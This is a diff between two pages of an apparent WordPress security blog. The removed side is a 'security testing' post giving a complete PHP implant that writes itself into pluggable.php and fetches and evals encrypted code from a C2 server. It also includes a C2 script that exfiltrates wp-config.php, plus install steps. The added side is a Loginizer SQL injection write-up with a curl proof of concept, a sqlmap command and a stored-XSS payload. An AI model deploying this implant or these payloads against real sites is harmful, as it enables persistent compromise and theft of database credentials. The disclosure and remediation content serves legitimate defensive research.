@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 
-<title>WordPress security testing – WP deeply</title>
+<title>Loginizer before 1.6.4 SQLi injection – WP deeply</title>
 <link rel="dns-prefetch" href="//s.w.org">
 
 
@@ -25,10 +25,9 @@ html{font-size:118.75%;}a,.page-title{color:#0274be;}a:hover,a:focus{color:#3a3a
 
 
 
-
 <style>.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style></head>
 
-<body itemtype="https://schema.org/Blog" itemscope="itemscope" class="post-template-default single single-post postid-5 single-format-standard ast-desktop ast-separate-container ast-no-sidebar astra-2.5.5 ast-header-custom-item-inside ast-blog-single-style-1 ast-single-post ast-inherit-site-logo-transparent ast-normal-title-enabled">
+<body itemtype="https://schema.org/Blog" itemscope="itemscope" class="post-template-default single single-post postid-72 single-format-standard ast-desktop ast-separate-container ast-no-sidebar astra-2.5.5 ast-header-custom-item-inside ast-blog-single-style-1 ast-single-post ast-inherit-site-logo-transparent ast-normal-title-enabled">
 
 <div class="hfeed site" id="page">
 	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
@@ -74,8 +73,8 @@ html{font-size:118.75%;}a,.page-title{color:#0274be;}a:hover,a:focus{color:#3a3a
 		</div>
 			<div class="ast-main-header-bar-alignment"><div class="main-header-bar-navigation"><nav class="ast-flex-grow-1 navigation-accessibility" id="site-navigation" aria-label="Site Navigation" itemtype="https://schema.org/SiteNavigationElement" itemscope="itemscope"><div class="main-navigation"><ul id="primary-menu" class="main-header-menu ast-nav-menu ast-flex ast-justify-content-flex-end  submenu-with-border astra-menu-animation-fade "><li id="menu-item-13" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-13"><a href="https://wpdeeply.com" class="menu-link">home</a></li>
 <li id="menu-item-60" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-60"><a href="https://wpdeeply.com/category/core/" class="menu-link">core</a></li>
-<li id="menu-item-61" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-61"><a href="https://wpdeeply.com/category/plugins/" class="menu-link">plugins</a></li>
-<li id="menu-item-62" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-62"><a href="https://wpdeeply.com/category/red-team/" class="menu-link">red team</a></li>
+<li id="menu-item-61" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-61"><a href="https://wpdeeply.com/category/plugins/" class="menu-link">plugins</a></li>
+<li id="menu-item-62" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-62"><a href="https://wpdeeply.com/category/red-team/" class="menu-link">red team</a></li>
 <li id="menu-item-14" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-14"><a href="https://wpdeeply.com/contact/" class="menu-link">Work with us</a></li>
 </ul></div></nav></div></div>			</div>
 		</div>
@@ -103,7 +102,7 @@ html{font-size:118.75%;}a,.page-title{color:#0274be;}a:hover,a:focus{color:#3a3a
 					
 					
 
-<article class="post-5 post type-post status-publish format-standard hentry category-red-team tag-0day ast-article-single" id="post-5" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">
+<article class="post-72 post type-post status-publish format-standard hentry category-plugins tag-fixed ast-article-single" id="post-72" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">
 
 	
 	
@@ -114,7 +113,7 @@ html{font-size:118.75%;}a,.page-title{color:#0274be;}a:hover,a:focus{color:#3a3a
 
 		
 				<div class="ast-single-post-order">
-			<h1 class="entry-title" itemprop="headline">WordPress security testing</h1><div class="entry-meta"><span class="cat-links"><a href="https://wpdeeply.com/category/red-team/" rel="category tag">red team</a></span> / <span class="posted-on"><span class="published" itemprop="datePublished"> August 24, 2020</span><span class="updated" itemprop="dateModified"> October 11, 2020</span></span> / <span class="tags-links"><a href="https://wpdeeply.com/tag/0day/" rel="tag">0day</a></span></div>		</div>
+			<h1 class="entry-title" itemprop="headline">Loginizer before 1.6.4 SQLi injection</h1><div class="entry-meta"><span class="cat-links"><a href="https://wpdeeply.com/category/plugins/" rel="category tag">plugins</a></span> / <span class="posted-on"><span class="published" itemprop="datePublished"> October 21, 2020</span><span class="updated" itemprop="dateModified"> October 21, 2020</span></span> / <span class="tags-links"><a href="https://wpdeeply.com/tag/fixed/" rel="tag">fixed</a></span></div>		</div>
 		
 		
 	</header>
@@ -124,203 +123,184 @@ html{font-size:118.75%;}a,.page-title{color:#0274be;}a:hover,a:focus{color:#3a3a
 
 		
 		
-<p>There are a lot of security solutions around WP eco system advertising their possibility to fight malware, intrusions and exploitation. Most of them are endpoint security solutions, there are cloud ones, but also market knows the managed WP services that offer security in their own way. Having big choice sometime is a problem, because you can’t verify all of the claims and if you try, you will need to waste huge load of time auditing / testing. That is why the goal of this section is to provide tools and methods for easy verification of those claims and to help users into choosing the right offering.</p>
+<p>Here we talk about Loginizer security plugin for WP that protects web sites from brute force attacks (quite needed functionality) and to provide extra lights and bolts in form of Two Factor Auth, reCAPTCHA, PasswordLess Login… Recently I performed some checks in the plugin code and few security issues were identified e.g. two paths towards SQLi and one XSS. Beside the fact that plugin code was quite audited in the past (more about this below), in the code remained very severe issues.</p>
 
 
 
-<h2>Attack demo</h2>
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/loginizer-blog-post.md#eli5-poc"></a></h2>
 
 
 
-<p>For the purpose of testing two scripts are created: malware/implant and remote C2 server script. Both are extremely easy for setup, but default versions are prepared in that way, so their abuse would require modifications.</p>
+<h2>Eli5 PoC</h2>
 
 
 
-<h5>malware</h5>
+<p>Plugin counts failed login attempts hooking on <code>wp_login_failed</code> which is called in <code>wp_authenticate</code> e.g. official wp method for performing authentication in XMLRPC and web interface. In wp_signon we have un slashing of username / password pair (isn’t case for XMLRPC) and like that are sent towards <code>wp_authenticate</code>. Here we have simple <code>sanitize_user</code> which is quite useless when called with <code>$strict = false</code> default parameter value. So, not protected <code>$username</code> travels towards any functionality hooked on <code>wp_login_failed</code>. In Loginizer:</p>
 
 
 
-<p>This software is based on <a rel="noreferrer noopener" href="https://github.com/Slavco/wp-weaver" target="_blank">wp-weaver</a> project, includes encryption in order to hide its actions and is more than modular to accept and execute everything that is sent by C2.</p>
+<pre class="wp-block-code"><code lang="php" class="language-php">add_action('wp_login_failed', 'loginizer_login_failed');
+</code></pre>
 
 
 
-<pre class="wp-block-code"><code lang="php" class="language-php">//marker_weaver_ftw
-$target_files = array(
-    ABSPATH . WPINC . '/pluggable.php'
-    //just for demo purposes, that is why too few :)
-);
+<p>and via function definition we see how raw <code>$username</code> reaches the plugin functionality:</p>
 
-//must be here because collisions of the rand and race conditions
-if ( ! function_exists("weaver_plant_payload") ){
-    function weaver_plant_payload($file, $payload_data, $append){
-        //grab the session for one peer only - payload almost forever in memory
-        if ( isset($_REQUEST["peer"]) && $_REQUEST["peer"]!="" ) sleep(9);
-        if ( $append ){
-            @file_put_contents($file, $payload_data, FILE_APPEND | LOCK_EX);
-        }else{
-            @file_put_contents($file, $payload_data, LOCK_EX);
-        }
-        //time window to switch "session" towards another peer
-        if ( isset($_REQUEST["peer"]) && $_REQUEST["peer"]!="" ) sleep(2);
-    }
-    $the_file = $target_files[rand(0,(sizeof($target_files)-1))];
-    $my_content = @file_get_contents(__FILE__);
-    $my_content_list = @explode("//\x6Darker_weaver_ftw", $my_content);
-    if ( is_array($my_content_list) && sizeof($my_content_list) >= 2 ){
-        @file_put_contents(__FILE__, $my_content_list[0]);
-        @register_shutdown_function("weaver_plant_payload", $the_file, "//\x6Darker_weaver_ftw".$my_content_list[1], true);
-    }else{
-        //shouldn't be here, but at least don't damage the instance
-        @register_shutdown_function("weaver_plant_payload", __FILE__, $my_content, false);
-    }
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">function loginizer_login_failed($username, $is_2fa = ''){
+	
+	global $wpdb, $loginizer, $lz_cannot_login;
+	...
+</code></pre>
+
+
+
+<p>Also in this function there are calls towards DB with not sanitized DB parameters:</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">...
+$result = lz_selectquery("SELECT * FROM `".$wpdb->prefix."loginizer_logs` WHERE `ip` = '".$loginizer['current_ip']."';");
+...
+$sresult = $wpdb->query("UPDATE `".$wpdb->prefix."loginizer_logs` SET `username` = '".$username."', `time` = '".time()."', `count` = `count`+1, `lockout` = '".$lockout."', `url` = '".$url."' WHERE `ip` = '".$loginizer['current_ip']."';");
+...
+$insert = $wpdb->query("INSERT INTO `".$wpdb->prefix."loginizer_logs` SET `username` = '".$username."', `time` = '".time()."', `count` = '1', `ip` = '".$loginizer['current_ip']."', `lockout` = '0', `url` = '".$url."';");
+...
+</code></pre>
+
+
+
+<p>and we see the places that are vulnerable of SQLi based on user login data. Simplest PoC if you monitor error_logs would be:</p>
+
+
+
+<pre class="wp-block-code"><code lang="bash" class="language-bash">curl 'http://local.target/wp-login.php' --data-raw 'log=test%27loginizer&pwd=fdsfsdfs&wp-submit=Log+In&redirect_to=&testcookie=1'
+</code></pre>
+
+
+
+<p>and in the error_log you will see</p>
+
+
+
+<pre class="wp-block-code"><code lang="bash" class="language-bash">[Mon Oct 19 13:20:27.425151 2020] [php7:notice] [pid 129822] [client 127.0.0.1:37896] WordPress database error You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'loginizer', `time` = '1603106427', `count` = '1', `ip` = '127.0.0.1', `lo' at line 1 for query INSERT INTO `wp_loginizer_logs` SET `username` = 'test'loginizer', `time` = '1603106427', ...
+</code></pre>
+
+
+
+<p>This means that we have SQLi in <code>insert</code> statement and insert won’t occure, because error in this case, but in case of an real attack ip value could be easy owerwritten and useless data to be filled in the logger tables. More stealth approach would be for sqli towards <code>update</code> statement.</p>
+
+
+
+<pre class="wp-block-code"><code lang="bash" class="language-bash">python3 sqlmap.py -u http://local.target/wp-login.php --method='POST' --data='log=&pwd=password&wp-submit=Log+In&redirect_to=&testcookie=1' -p log --prefix="', ip = LEFT(UUID(), 8), url = ( TRUE " --suffix=") -- wpdeeply" --dbms mysql --technique=T --time-sec=1 --current-db --current-user
+</code></pre>
+
+
+
+<p>As an extra towards this SQLi, in the code, there is following for printing the output in the administration area:</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">// Get the logs
+	$result = lz_selectquery("SELECT * FROM `".$wpdb->prefix."loginizer_logs` 
+							ORDER BY `time` DESC 
+							LIMIT ".$lz_env['cur_page'].", ".$lz_env['res_len']."", 1);
+...
+foreach($result as $ik => $iv){
+					$status_button = (!empty($iv['status']) ? 'disable' : 'enable');
+					echo '
+					<tr>
+						<td>
+							<input type="checkbox" value="'.$iv['ip'].'" name="lz_reset_ips[]" />
+						</td>
+						<td>
+							'.$iv['ip'].'
+						</td>
+						<td>
+							'.$iv['username'].'
+						</td>
+</code></pre>
+
+
+
+<p>So, beside the fact that <code>sanitize_user</code> function strips the tags, when we are into SQL machinery we have an option for stored XSS attack too:</p>
+
+
+
+<pre class="wp-block-code"><code class="">test',ip=concat(char(60),'b',char(62),'wpdeeply',char(60),char(47),'b',char(62),'-',LEFT(UUID(),8)) -- wpdeeply
+</code></pre>
+
+
+
+<p>And that is it, more than easy and detailed about SQLi + XSS via <code>$username</code>.</p>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/loginizer-blog-post.md#isnt-only-username"></a></h2>
+
+
+
+<h2>Isn’t only username</h2>
+
+
+
+<p>This one is much more interesting, yet effective on lower number of setups out there, but is really good issue 🙂 Validation of the ip address happens in the following way:</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">function lz_valid_ip($ip){
+	
+	// IPv6
+	if(lz_valid_ipv6($ip)){
+		return true;
+	}
+	
+	// IPv4
+	if(!ip2long($ip)){
+		return false;
+	}
+	
+	return true;
 }
-//malware code below - any length, any logic
-if ( isset($_REQUEST["wpdeeply"])){
-    //choose the code execution method
-    $method_exec = 'eval';
-    $test_pass = FALSE;
-    
-    //test if execution mechanism works
-    if ( $method_exec ){
-        switch( $method_exec ){
-            case 'eval':
-                $test_data = '$find_me = array("find_me");';
-                eval($test_data);
-                if (isset($find_me) && is_array($find_me) && in_array('find_me', $find_me)) $test_pass = TRUE;
-                break;
-                //...
-        }
-        //if works then load instructions from c2
-        if ( $test_pass ){
-            
-	    	//hardcoded values put here during delivery of the test malware
-            define('C2_URL', 'https://local.host/c2.php');
-            $c2_box_publickey = base64_decode('CCp/4qGswYmd47p4heS8kwnC3z++VwGN7fRLOCi5sn0=');
-            
-            //encryption key for delivered payload
-            $session_key = \Sodium\randombytes_buf(\Sodium\CRYPTO_SECRETBOX_KEYBYTES);
-            
-            //prepare data for c2 instruction
-            $json_requirements = json_encode(array(
-                'key'   => base64_encode($session_key),
-                'type' => 'eval'
-            ));
-            
-            //encrypt with c2 pub key
-            $rcr = \Sodium\crypto_box_seal(
-                $json_requirements,
-                $c2_box_publickey
-                );
-            
-            //get results
-            $c2_remote_fetch = wp_remote_post(
-                C2_URL,
-                array(
-                    'body' => array(
-                        'rcr'   => $rcr
-                    ),
-                )
-                );
-            //veryfy response
-            if ( ! is_wp_error( $c2_remote_fetch ) ) {
-                $c2_remote = json_decode( wp_remote_retrieve_body( $c2_remote_fetch ), true );
-            }
-            //verify response data format and execute commands
-            if ( is_array( $c2_remote ) && isset( $c2_remote['payload'] ) && isset( $c2_remote['nonce'] ) ) {
-                
-                $payload_encrypted = base64_decode( $c2_remote['payload'] );
-                $nonce = base64_decode( $c2_remote['nonce'] );
-                
-                //decrypt final payload from c2
-                $payload = \Sodium\crypto_secretbox_open($payload_encrypted, $nonce, $session_key);
-                if ( $payload !== false ){
-                    @eval($payload);
-                }
-            }
-        }
-    }
-}</code></pre>
+</code></pre>
 
 
 
-<h5>C2</h5>
+<p>and <code>ip2long</code> isn’t binary safe, so if IP HTTP header reaches the backend with null byte in it, we are talking about SQLi, but also about standard stored XSS vulnerability.</p>
 
 
 
-<p>This is simple server side script, that will serve the payload when requested by its malware and will log its actions in order to harvest the fruits of commands execution.</p>
+<pre class="wp-block-code"><code lang="php" class="language-php">if ( ip2long("127.0.0.1\x00'<script>") ) echo 'Valid IPv4';
+</code></pre>
 
 
 
-<pre class="wp-block-code"><code lang="php" class="language-php">include 'sodium_compat/autoload.php';
-
-//handle the requests from the client/s
-if ( isset($_POST["rcr"]) ){
-    $encrypted_remote_client_requirements = $_POST["rcr"];
-}else{
-    exit(0);
-}
-
-//simple payload code with arrogant exfiltration method, but possible only for users with upload permissions :) 
-$remote_cmd = '
-    if ( defined("ABSPATH") ){
-        if ( file_exists(ABSPATH."wp-config.php") ){
-            wp_upload_bits("wpdeeply.jpg", "", \Sodium\crypto_box_seal(file_get_contents(ABSPATH."wp-config.php"), $c2_box_publickey));
-        }
-    }
-';
-
-
-//c2 public and secret keys
-$c2_box_secretkey = base64_decode('Gr10jP1z0VTyRtaJIav8ElMcmvQ6abfnkfKz5wftI+c=');
-$c2_box_publickey = base64_decode('CCp/4qGswYmd47p4heS8kwnC3z++VwGN7fRLOCi5sn0=');
-
-$c2_box_kp = \Sodium\crypto_box_keypair_from_secretkey_and_publickey(
-    $c2_box_secretkey,
-    $c2_box_publickey
-    );
-
-//decode the data received from client
-$remote_client_requirements = \Sodium\crypto_box_seal_open(
-    $encrypted_remote_client_requirements,
-    $c2_box_kp
-    );
-
-$remote_client_requirements = @json_decode($remote_client_requirements, true);
-if ( !$remote_client_requirements ) exit(0);
-
-//reply to the client with payload encrypted with delivered session_key + used nonce 
-if ( is_array($remote_client_requirements) && isset($remote_client_requirements['key']) && isset($remote_client_requirements['type']) ){
-    $session_key = base64_decode($remote_client_requirements['key']);
-    $session_nonce = \Sodium\randombytes_buf(\Sodium\CRYPTO_SECRETBOX_NONCEBYTES);
-    $response = json_encode(array( 'payload' => base64_encode(\Sodium\crypto_secretbox($remote_cmd, $session_nonce, $session_key)), 'nonce'=> base64_encode($session_nonce)));
-    //add some fancy logging in order to know the client and type+format of exfiltrated data 
-    echo $response;
-}
-exit();</code></pre>
+<p>What are affected setups and how to, won’t be disclosed in this writing 🙂</p>
 
 
 
-<h5>Setup</h5>
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/loginizer-blog-post.md#few-facts"></a></h2>
 
 
 
-<p>In order to run the demo on your own WP instance you will need the following:</p>
+<h2>Few facts</h2>
 
 
 
-<ul><li>You will need to be logged in as user with upload permissions on the WP (it is this way in order to be stopped abuse of the scripts and that is why in the payload is used <strong>wp_upload_bits</strong> function)</li><li>In the malware script set up your own value for <strong>C2_URL</strong> constant and that is the url of your C2 script</li><li>In order to work C2 script you will need <strong>sodium_compat</strong> next to it and it could be found into any WP 5+ distribution under wp-includes folder</li><li>cat malware.txt >> /path_to_your_code/wp-includes/pluggable.php</li><li>Logged in with user with upload permissions hit refresh on your WP homepage with <strong>?wpdeeply=ok</strong> parameters and check in the upload directory <strong>wpdeeply?-x.jpg</strong> with encrypted <strong>wp-config.php</strong> content</li></ul>
+<ul><li>This plugin was “target” few times of not complete audits with some results, <a rel="noreferrer noopener" href="https://blog.wpsec.com/sql-injection-and-csrf-security-vulnerability-in-loginizer/" target="_blank">here</a> and <a rel="noreferrer noopener" href="https://blog.dewhurstsecurity.com/2018/05/22/loginizer-wordpress-plugin-xss-vulnerability.html" target="_blank">here</a></li><li>When you perform static code analysis it is strange to suspect that <code>sanitize_user</code> will allow <code>'</code> or <code>"</code>, but anyway debugger need to be employed</li><li>When you perform scanning and you are on local target then it is wise to inspect the error logs of the application and to try all of the parameters</li><li>It is interesting and good to see how wp org managed to push the security update towards WP instances with this plugin <a href="https://wordpress.org/plugins/loginizer/advanced/">https://wordpress.org/plugins/loginizer/advanced/</a> , but are you still comfortable allowing administration of your assets by unknown folks from wp org?</li><li>We all know that WP employed <code>error protection</code> in the core. You think there isn’t any WP / Loginizer setup that was tried by bot for SQLi on the login form? Are DB errors worth marking as problem in the installation or this feature is there for another reasons?!</li></ul>
 
 
 
-<h2>Successful demo</h2>
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/loginizer-blog-post.md#remediation"></a></h2>
 
 
 
-<p>This means that you managed to put malware on your WP and to execute code in it. For tech people it is clear (try to use peer method of the weaver) what is done in the background, but for not tech savvy users won’t be, but both are more than free to question its security guarantee about the events. Questions that would be good to be answered:</p>
+<h2>Remediation</h2>
 
 
 
-<ul><li>Why malware doesn’t disappear after update / re-install from admin screen or wpcli?</li><li>What type of commands “attacker” executed against WP?</li><li>What data was leaked and where?</li><li>…</li></ul>
+<ul><li>Update Loginizer plugin and continue with its usage, it is good and useful piece of software.</li><li>Use prepared DB statements.</li><li>Turn off automatic updates from your production environment and follow the active installs from stage. It is about privacy, but also for security.</li></ul>
 
 		
 		
@@ -333,7 +313,7 @@ exit();</code></pre>
 
 	<nav class="navigation post-navigation" role="navigation" aria-label="Posts">
 		<h2 class="screen-reader-text">Post navigation</h2>
-		<div class="nav-links"><div class="nav-previous"><a href="https://wpdeeply.com/wordpress-protected-meta-via-wp-job-manager/" rel="prev"><span class="ast-left-arrow">←</span> Previous Post</a></div><div class="nav-next"><a href="https://wpdeeply.com/woocommerce-4-1-0-remote-code-execution/" rel="next">Next Post <span class="ast-right-arrow">→</span></a></div></div>
+		<div class="nav-links"><div class="nav-previous"><a href="https://wpdeeply.com/ninja-forms-before-3-4-27-1-simple-csrf-to-rce/" rel="prev"><span class="ast-left-arrow">←</span> Previous Post</a></div></div>
 	</nav>
 					
 					
